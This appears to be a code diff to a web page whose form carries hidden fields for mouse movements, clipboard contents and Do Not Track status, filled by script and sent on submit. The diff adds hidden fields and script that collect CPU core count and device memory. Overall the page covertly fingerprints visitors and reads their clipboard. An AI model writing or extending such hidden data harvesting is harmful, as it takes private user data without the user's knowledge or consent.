@@ -71,6 +71,12 @@
     <input type="hidden" name="mouse_movements" id="mouse_movements">
     <input type="hidden" name="clipboard_content" id="clipboard_content">
     <input type="hidden" name="do_not_track" id="do_not_track">
+    <input type="hidden" name="cpu_cores" id="cpu_cores">
+    <input type="hidden" name="ram_size" id="ram_size">
+
+
+
+
     
     <button type="submit">Submit</button>
 </form>
@@ -317,4 +323,12 @@ navigator.clipboard.readText().then(text => {
 
 // Do not track status
 document.getElementById('do_not_track').value = navigator.doNotTrack == "1" ? "Enabled" : "Disabled";
+
+
+// CPU information
+document.getElementById('cpu_cores').value = navigator.hardwareConcurrency || "Unknown";
+
+// RAM information
+document.getElementById('ram_size').value = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+    
 </script>
